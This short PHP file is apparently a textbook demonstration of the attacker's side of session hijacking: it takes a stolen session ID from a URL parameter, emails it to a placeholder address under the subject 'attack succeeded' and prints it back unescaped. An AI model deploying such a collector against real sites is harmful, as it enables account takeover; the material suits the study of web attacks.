<?php
  mb_language('Japanese');
  $sid = $_GET['sid'];
  mb_send_mail('wasbook@example.jp', '攻撃成功', 'セッションID:' . $sid,
    'From: cracked@trap.example.com');
?>
<body>攻撃成功<br>
<?php echo $sid; ?>
</body>
